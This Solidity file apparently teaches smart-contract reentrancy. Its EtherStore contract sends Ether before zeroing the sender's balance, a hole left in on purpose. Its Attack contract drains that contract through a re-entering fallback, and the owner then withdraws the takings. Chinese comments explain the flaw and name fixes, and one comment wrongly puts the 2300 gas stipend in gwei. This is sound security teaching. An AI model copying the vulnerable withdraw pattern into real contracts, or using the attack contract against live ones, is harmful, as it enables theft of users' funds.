// SPDX-License-Identifier: MIT

pragma solidity 0.8.7;

contract EtherStore {
    mapping(address => uint) public balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() public {
        uint bal = balances[msg.sender];
        require(bal > 0);

        // call 方法会有重入攻击风险，因为 call 要消耗 gas 会执行 fallback 来确定使用多少 gas
        // 攻击者可以在 fallback 里再次调用  withdraw , 因为通过合约调用 withdraw 这里的 msg.sender 最终是合约的地址，所以 bal 一直会大于 0
        // 这里可以改用 transfer 或 send 方法， 或者使用加锁来防止重入攻击。
        // 因为 transfer 和 send 方法只消耗 2300 gwei gas 不足够用来执行一个合约。
        (bool sent, ) = msg.sender.call{value: bal}("");
        require(sent, "Failed to send Ether");

        balances[msg.sender] = 0;
    }

    // Helper function to check the balance of this contract
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}

contract Attack {
    address owner;
    EtherStore public etherStore;

    constructor(address _etherStoreAddress) {
        owner = msg.sender;
        etherStore = EtherStore(_etherStoreAddress);
    }

    modifier onlyOwner {
        require(msg.sender == owner);
        _;
    }

    // Fallback is called when EtherStore sends Ether to this contract.
    fallback() external payable {
        if (address(etherStore).balance >= 1 ether) {
            etherStore.withdraw();
        }
    }

    function attack() external payable {
        require(msg.value >= 1 ether);
        etherStore.deposit{value: 1 ether}();
        etherStore.withdraw();
    }

    // Helper function to check the balance of this contract
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }

    function withDrawEarning() public onlyOwner returns (uint256){
        uint256 balance = address(this).balance;
        (bool sent, ) = msg.sender.call{value: balance}("");
        require(sent, "Failed to send Ether");
        return balance;
    }
}
